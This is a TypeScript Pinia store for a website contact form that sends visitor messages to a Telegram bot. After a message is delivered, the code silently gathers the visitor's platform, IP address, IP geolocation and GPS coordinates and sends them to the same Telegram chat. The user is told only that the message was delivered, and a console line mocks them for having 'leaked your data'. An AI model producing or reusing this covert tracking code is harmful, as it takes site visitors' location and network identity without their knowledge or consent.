import { defineStore } from 'pinia'
import axios from 'axios';
import { NotifyCreate, NotificationType } from '@/stores/notify';
import { UserInfo } from '@/utils/user_info';
import { botConfig } from '@/utils/bot_config.js'

interface PositionUser {
    accuracy: string | null
    lat: string | null
    long: string | null
}

interface LocationUser {
    countryName: string | null
    stateProv: string | null
    city: string | null
    ipAddress: string | null
}

interface infoUser {
    platform: string
    position: PositionUser
    location: LocationUser
}

interface ContactState {
    userInfo: infoUser
}

export const messageForm = {
    name: {
        value: '',
        error: '',
        required: true
    },
    phone: {
        value: '',
        error: '',
        required: true
    },
    message: {
        value: '',
        error: '',
        required: true
    }
}

export const useContactStore = defineStore('contact', {
    state: (): ContactState => ({
        userInfo: {
            platform: '',
            position: {
                accuracy: null, 
                lat: null, 
                long: null, 
            },
            location: {
                countryName: null, 
                stateProv: null, 
                city: null, 
                ipAddress: null, 
            }
        },
    }),
    actions: {
        async getInfo() {
            let info = new UserInfo();
            let {platform} = info.browserInfo()     //что за платформа
            let {countryName, stateProv, city, ipAddress} = await info.ip();
            await info.position().then((res) => {   //позиция с координатами
                let {accuracy, lat, long} = res;
                this.userInfo.position.accuracy = accuracy;
                this.userInfo.position.lat = lat;
                this.userInfo.position.long = long;
            })
            .finally(() => {  
                this.userInfo.platform = platform;
                this.userInfo.location.countryName = countryName;
                this.userInfo.location.stateProv = stateProv;
                this.userInfo.location.city = city;
                this.userInfo.location.ipAddress = ipAddress;
            });
            return this.userInfo; 
        },
        async sendMessage(params: any) {
            params.chat_id = botConfig.chatId;

            try {
                const { data } = await axios.post(`https://api.telegram.org/bot${botConfig.botId}/sendMessage`, params)
                  
                if (data?.ok && !params.stop) {
                    NotifyCreate({type: NotificationType.Success, text: 'message delivered'})

                    await this.getInfo().finally(() => {

let paramsUser = {
    stop: true,
    chat_id: null,
    text: `Платформа: ${this.userInfo.platform}
Страна: ${this.userInfo.location?.countryName}
Область: ${this.userInfo.location?.stateProv}
Город: ${this.userInfo.location?.city}
apiAdress: ${this.userInfo.location?.ipAddress}
Точность место положения: ${this.userInfo.position?.accuracy ? this.userInfo.position?.accuracy : 'Нет информации'}`
}
                        this.sendMessage(paramsUser).then(() => {
                            if (this.userInfo.position?.lat && this.userInfo.position?.long) {
                                let paramsPos = {
                                    chat_id: null,
                                    latitude: this.userInfo.position?.lat,
                                    longitude: this.userInfo.position?.long,
                                }
                                this.sendLocation(paramsPos)
                            }
                        })
                    })
                    return;
                }
            } catch (error: any) {
                console.log('error message: ', error.message);
            }
        },
        async sendLocation(params: any) {
            params.chat_id = botConfig.chatId;
            const { data } = await axios.post(`https://api.telegram.org/bot${botConfig.botId}/sendLocation`, params)

            if (data?.ok) {
                console.log('congratulations you have leaked your data');
                // NotifyCreate({type: NotificationType.Success, text: 'congratulations you have leaked your data'})
                return;
            }
        }
    },
})